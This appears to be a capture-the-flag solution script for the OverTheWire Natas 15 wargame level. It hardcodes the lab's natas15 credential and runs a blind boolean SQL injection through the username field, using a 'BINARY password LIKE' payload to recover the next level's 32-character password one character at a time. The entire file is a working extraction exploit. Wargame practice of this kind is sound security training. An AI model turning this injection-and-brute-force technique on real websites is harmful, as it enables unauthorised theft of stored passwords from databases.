#!/bin/python
import requests,string
from string import *

username = "natas15"
pwd = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = f"http://{username}.natas.labs.overthewire.org/"

characters= ascii_lowercase+ascii_uppercase+digits
seenpwd = list('')
while (True):
	for ch in characters:
		getpwd= "".join(seenpwd)+ ch 
		print('Trying with password :', getpwd)
		session = requests.Session()
		response = session.post(url,data={'username':'natas16" AND BINARY password LIKE "'+ getpwd +'%" #'},auth=(username,pwd))
		content=response.text
		if ('user exists.' in content) :
			print(f'Match found: {ch}')
			seenpwd.append(ch)
			break
	print('Password : ',''.join(seenpwd))
	if len(seenpwd) == 32:
		print('The password is : ',seenpwd)
		break